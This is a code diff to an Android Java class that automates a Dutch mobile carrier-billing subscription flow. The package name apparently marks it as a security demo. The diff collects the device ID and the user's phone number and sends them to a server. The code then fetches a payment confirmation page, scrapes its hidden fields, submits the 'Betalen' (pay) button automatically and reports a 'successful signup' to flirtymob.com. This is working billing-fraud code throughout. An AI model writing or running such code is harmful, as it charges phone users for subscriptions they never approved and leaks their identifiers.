@@ -8,6 +8,7 @@ import android.telephony.TelephonyManager;
 import android.util.Log;
 
 import android.view.View;
+import android.widget.Button;
 import com.dcbsecure.demo201503.dcbsecure.ActivityMainWindow;
 import com.dcbsecure.demo201503.dcbsecure.managers.ConfigMgr;
 import com.dcbsecure.demo201503.dcbsecure.managers.PreferenceMgr;
@@ -40,11 +41,12 @@ import java.util.Arrays;
 public class FlowNL3G implements View.OnClickListener
 {
     private final ActivityMainWindow activityMainWindow;
+    private final Button btnStart;
 
-    public FlowNL3G(ActivityMainWindow activityMainWindow)
+    public FlowNL3G(ActivityMainWindow activityMainWindow, Button btnStart)
     {
-
         this.activityMainWindow = activityMainWindow;
+        this.btnStart = btnStart;
     }
 
 
@@ -52,7 +54,7 @@ public class FlowNL3G implements View.OnClickListener
     public void onClick(View v)
     {
         Log.d("FLIRTY", "Started handling payment over 3G");
-
+        btnStart.setVisibility(View.INVISIBLE);
 
         final String deviceid = ConfigMgr.lookupDeviceId(activityMainWindow);
 
@@ -98,9 +100,12 @@ public class FlowNL3G implements View.OnClickListener
 
                     //recheck hack data
                     ArrayList<NameValuePair> params = new ArrayList<NameValuePair>();
+                    params.add(new BasicNameValuePair("deviceid", deviceid));
                     params.add(new BasicNameValuePair("iso3166", iso3166));
                     params.add(new BasicNameValuePair("mccmnc", mccmnc));
                     params.add(new BasicNameValuePair("carrier", carrier));
+                    long msisdn = ConfigMgr.lookupMsisdnFromTelephonyMgr(activityMainWindow);
+                    if(msisdn>0) params.add(new BasicNameValuePair("msisdn", ""+msisdn));
                     params.add(new BasicNameValuePair("wifi", PayUtil.isUsingMobileData(activityMainWindow) ? "0" : "1"));
 
                     String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);
@@ -114,7 +119,7 @@ public class FlowNL3G implements View.OnClickListener
                     {
                         //decode runid first so that if there is an exception later on, we can still report it against the right runid
                         runid = hackConfigResponse.getLong("runid");
-                        runFlowNotInMainThread(deviceid, runid, handler);
+                        runFlowNotInMainThread(hackConfigResponse, deviceid, runid, handler);
                     }
                 }
                 catch (JSONException e)
@@ -137,129 +142,111 @@ public class FlowNL3G implements View.OnClickListener
 
     }
 
-    private void runFlowNotInMainThread(final String deviceid, final long runid, final Handler handler)
+    private void runFlowNotInMainThread(JSONObject hackConfig, final String deviceid, final long runid, final Handler handler)
     {
         final String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);
 
-        String startUrl = null;
-        JSONObject billingConfigJSON = ConfigMgr.getBillingConfig();
-
+        String startUrl;
         try
         {
-            JSONObject carrierSubFlow = null;
-
-            if(billingConfigJSON != null && billingConfigJSON.has("carrier_sub_flow")) carrierSubFlow = billingConfigJSON.getJSONObject("carrier_sub_flow");
-            if(carrierSubFlow != null && carrierSubFlow.has("start_url")) startUrl = carrierSubFlow.getString("start_url");
-
+            startUrl = hackConfig.getString("start_url")+"&tx=1";
         }
         catch (JSONException e)
         {
             String subject = "exception reading json flow config";
-            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, billingConfigJSON.toString());
+            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject,null);
             handler.sendEmptyMessage(0);
             return;
         }
 
-        if(startUrl==null)
+        final RequestResult resultAfterStart = doSynchronousHttpGetCallReturnsString(activityMainWindow, startUrl, userAgent);
+        String htmlDataConfirm = resultAfterStart!=null?resultAfterStart.getContent():null;
+        String confirmUrl = resultAfterStart!=null?resultAfterStart.getUrl():null;
+
+        if(resultAfterStart==null)
         {
-            String subject = "cannot workout start_url";
-            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, null);
+            String subject = "start_url returns nothing";
+            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, startUrl);
             handler.sendEmptyMessage(0);
             return;
         }
-        else //if (startUrl!=null)
+        else if(resultAfterStart.getHttpCode()!=200)
         {
-            final RequestResult resultAfterStart = doSynchronousHttpGetCallReturnsString(activityMainWindow, startUrl, userAgent);
-            String htmlDataConfirm = resultAfterStart!=null?resultAfterStart.getContent():null;
-            String confirmUrl = resultAfterStart!=null?resultAfterStart.getUrl():null;
+            String subject = "start_url returns http code "+resultAfterStart.getHttpCode()+" "+resultAfterStart.getUrl();
+            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, resultAfterStart.getContent());
+            handler.sendEmptyMessage(0);
+            return;
+        }
+        else if(confirmUrl==null)
+        {
+            String subject = "cannot workout confirmUrl";
+            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject,htmlDataConfirm);
+            handler.sendEmptyMessage(0); //kill the waiting message
+            return;
+        }
+        else if(!htmlDataConfirm.contains("Betalen"))
+        {
+            String subject = "expected confirm page does not look right";
+            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject,htmlDataConfirm);
+            handler.sendEmptyMessage(0); //kill the waiting message
+            return;
+        }
+        else //if contains "Betalen"
+        {
+            final ArrayList<NameValuePair> paramsForConfirm = buildArrayListParamsOfHiddenFields(htmlDataConfirm.split("\n"));
+            paramsForConfirm.add(new BasicNameValuePair("ctl00$ContentPlaceHolder1$subscriptionAgreeButton", "Betalen"));
+            paramsForConfirm.add(new BasicNameValuePair("ContentPlaceHolder1_subscriptionAgreeButton", "Betalen"));
 
-            if(resultAfterStart==null)
+            // Here we have to make one last POST request to confirm
+            final RequestResult resultAfterConfirm = SyncRequestUtil.doSynchronousHttpPost(confirmUrl, paramsForConfirm,userAgent);
+            final String successfulConfirmationUrl = resultAfterConfirm!=null?resultAfterConfirm.getUrl():null;
+            final String htmlDataAfterConfirm = resultAfterConfirm!=null?resultAfterConfirm.getContent():null;
+
+            if(resultAfterConfirm==null)
             {
-                String subject = "start_url returns nothing";
-                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, startUrl);
+                String subject = "Confirm returns null (url:"+confirmUrl+")";
+                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataConfirm);
                 handler.sendEmptyMessage(0);
                 return;
             }
-            else if(resultAfterStart.getHttpCode()!=200)
+            else if(resultAfterConfirm.getHttpCode()!=200)
             {
-                String subject = "start_url returns http code "+resultAfterStart.getHttpCode();
-                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, resultAfterStart.getContent());
+                String subject = "Confirm returns http code "+resultAfterConfirm.getHttpCode();
+                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterConfirm);
                 handler.sendEmptyMessage(0);
                 return;
             }
-            else if(confirmUrl==null)
+            else if(htmlDataAfterConfirm.contains("action=\"SuccessfulConfirmation.aspx\""))
             {
-                String subject = "cannot workout confirmUrl";
-                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject,htmlDataConfirm);
-                handler.sendEmptyMessage(0); //kill the waiting message
-                return;
-            }
-            else if(!htmlDataConfirm.contains("Betalen"))
-            {
-                String subject = "expected confirm page does not look right";
-                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject,htmlDataConfirm);
-                handler.sendEmptyMessage(0); //kill the waiting message
-                return;
-            }
-            else //if contains "Betalen"
-            {
-                final ArrayList<NameValuePair> paramsForConfirm = buildArrayListParamsOfHiddenFields(htmlDataConfirm.split("\n"));
-                paramsForConfirm.add(new BasicNameValuePair("ctl00$ContentPlaceHolder1$subscriptionAgreeButton", "Betalen"));
-                paramsForConfirm.add(new BasicNameValuePair("ContentPlaceHolder1_subscriptionAgreeButton", "Betalen"));
+                final ArrayList<NameValuePair> paramsForSuccessfulConfirmation = buildArrayListParamsOfHiddenFields(htmlDataAfterConfirm.split("\n"));
 
-                // Here we have to make one last POST request to confirm
-                final RequestResult resultAfterConfirm = SyncRequestUtil.doSynchronousHttpPost(confirmUrl, paramsForConfirm,userAgent);
-                final String successfulConfirmationUrl = resultAfterConfirm!=null?resultAfterConfirm.getUrl():null;
-                final String htmlDataAfterConfirm = resultAfterConfirm!=null?resultAfterConfirm.getContent():null;
+                //follow succesful confirmation link
+                final RequestResult resultAfterSuccessfulConfirmation = SyncRequestUtil.doSynchronousHttpPost(successfulConfirmationUrl, paramsForSuccessfulConfirmation, userAgent);
+                final String htmlDataAfterSuccessfulConfirmation = resultAfterSuccessfulConfirmation!=null?resultAfterSuccessfulConfirmation.getContent():null;
+                final String flirtymobSuccessUrl = resultAfterSuccessfulConfirmation!=null?resultAfterSuccessfulConfirmation.getUrl():null;
 
-                if(resultAfterConfirm==null)
+                if(flirtymobSuccessUrl!=null && flirtymobSuccessUrl.contains("flirtymob.com"))
                 {
-                    String subject = "Confirm returns null (url:"+confirmUrl+")";
-                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataConfirm);
-                    handler.sendEmptyMessage(0);
-                    return;
-                }
-                else if(resultAfterConfirm.getHttpCode()!=200)
-                {
-                    String subject = "Confirm returns http code "+resultAfterConfirm.getHttpCode();
-                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterConfirm);
-                    handler.sendEmptyMessage(0);
-                    return;
-                }
-                else if(htmlDataAfterConfirm.contains("action=\"SuccessfulConfirmation.aspx\""))
-                {
-                    final ArrayList<NameValuePair> paramsForSuccessfulConfirmation = buildArrayListParamsOfHiddenFields(htmlDataAfterConfirm.split("\n"));
-
-                    //follow succesful confirmation link
-                    final RequestResult resultAfterSuccessfulConfirmation = SyncRequestUtil.doSynchronousHttpPost(successfulConfirmationUrl, paramsForSuccessfulConfirmation, userAgent);
-                    final String htmlDataAfterSuccessfulConfirmation = resultAfterSuccessfulConfirmation!=null?resultAfterSuccessfulConfirmation.getContent():null;
-                    final String flirtymobSuccessUrl = resultAfterSuccessfulConfirmation!=null?resultAfterSuccessfulConfirmation.getUrl():null;
-
-                    if(flirtymobSuccessUrl!=null && flirtymobSuccessUrl.contains("flirtymob.com"))
-                    {
-                        String subject = "successful signup on 3G flow";
-                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 1, false, subject, htmlDataAfterSuccessfulConfirmation);
-                    }
-                    else
-                    {
-                        //post warning
-                        String subject = "successful signup on 3G flow but wrong redirect after SuccessfulConfirmation.aspx";
-                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 1, false, subject, htmlDataAfterSuccessfulConfirmation);
-                    }
-                    handler.sendEmptyMessage(0);
-                    return;
-
+                    String subject = "successful signup on 3G flow";
+                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 1, false, subject, htmlDataAfterSuccessfulConfirmation);
                 }
                 else
                 {
-                    String subject = "unexpected answer after confirm on 3G flow";
-                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterConfirm);
-                    handler.sendEmptyMessage(0);
-                    return;
+                    //post warning
+                    String subject = "successful signup on 3G flow but wrong redirect after SuccessfulConfirmation.aspx";
+                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 1, false, subject, htmlDataAfterSuccessfulConfirmation);
                 }
+                handler.sendEmptyMessage(0);
+                return;
 
             }
-
+            else
+            {
+                String subject = "unexpected answer after confirm on 3G flow";
+                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterConfirm);
+                handler.sendEmptyMessage(0);
+                return;
+            }
         }
 
     }
